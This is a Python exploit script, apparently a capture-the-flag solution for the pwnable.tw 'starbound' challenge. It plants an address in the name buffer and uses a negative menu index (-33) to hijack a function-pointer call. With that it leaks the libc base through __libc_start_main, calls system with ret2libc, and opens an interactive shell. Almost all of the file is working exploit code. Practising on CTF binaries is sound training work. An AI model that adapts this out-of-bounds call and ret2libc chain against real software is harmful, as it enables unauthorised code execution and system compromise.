#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./starbound')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10202)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x0804A6D9
continue
'''.format(**locals())

# -- Exploit goes here --

def option(choice):
    sa("> ", str(choice))

def change_name(name):
    option(6)
    option(2)
    sla("Enter your name: ", name)
    option(1)

libc = ELF("./libc.so.6")
io = start()
change_name(p32(0x08048e48))
sla("> ", b"-33\x01" + b"A"*4 + ret2libcleak("__libc_start_main"))
libc.address = u64_bytes(4) - libc.sym['__libc_start_main']
log.info(f"libc base : {hex(libc.address)}")
change_name(p32(0x08048e48))
sla("> ", b"-33\x01" + b"A"*4 + ret2libcsystem())
io.interactive()